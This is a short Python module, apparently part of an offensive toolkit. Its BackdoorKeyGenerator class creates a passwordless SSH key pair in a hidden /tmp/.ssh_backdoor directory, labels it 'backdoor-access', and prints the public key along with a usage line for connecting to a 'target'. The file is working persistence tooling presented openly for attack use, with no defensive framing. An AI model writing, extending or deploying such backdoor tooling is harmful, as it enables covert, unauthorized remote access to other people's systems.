import os
from ..utils.helpers import run_command

class BackdoorKeyGenerator:
    @staticmethod
    def generate():
        key_dir = "/tmp/.ssh_backdoor"
        os.makedirs(key_dir, exist_ok=True)
        private = f"{key_dir}/id_backdoor"
        public = f"{private}.pub"

        cmd = f"ssh-keygen -t ed25519 -f {private} -N '' -C 'backdoor-access' -q"
        result = run_command(cmd)

        if result['success'] or os.path.exists(public):
            with open(public, 'r') as f:
                pub_key = f.read().strip()

            print(f"[+] Backdoor key pair generated")
            print(f"[+] Private: {private}")
            print(f"[+] Public : {public}")
            print(f"\n[+] Public key content:")
            print(pub_key)
            print(f"\n[!] Use: ssh -i {private} user@target")

            return {
                'private_key': private,
                'public_key_file': public,
                'public_key_content': pub_key
            }
        else:
            print("[-] Failed to generate key")
            return None